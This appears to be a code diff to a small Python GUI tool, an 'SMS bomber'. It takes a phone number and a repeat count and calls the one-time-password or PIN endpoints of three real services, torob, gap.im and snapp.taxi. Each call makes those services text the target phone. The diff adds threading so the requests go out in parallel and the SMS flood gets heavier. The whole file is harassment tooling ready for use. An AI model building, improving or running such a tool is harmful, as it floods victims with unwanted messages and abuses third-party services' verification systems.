@@ -1,18 +1,29 @@
 import requests
 import tkinter as tk
+import threading
 
 def spam():
     try:
         phone = phone_entry.get()
-        count = count_entry.get()
+        count = int(count_entry.get())
         data = {"cellphone": phone}
         
-        for n in range(int(count)):
+        def send_sms():
             print("SMS send")
             requests.get("https://api.torob.com/a/phone/send-pin/?phone_number=" + phone)
             requests.get("https://core.gap.im/v1/user/add.json?mobile=" + phone)
             requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", data)
-    
+        
+        threads = []
+        for n in range(count):
+            t = threading.Thread(target=send_sms)
+            t.start()
+            threads.append(t)
+        
+        # Wait for all threads to finish
+        for t in threads:
+            t.join()
+            
     except Exception as e:
         print(f"ERROR: {e}")
 
@@ -43,4 +54,3 @@ start_button = tk.Button(root, text="Start", font=("Helvetica", 12, "bold"), bg=
 start_button.pack(pady=20)
 
 root.mainloop()
-
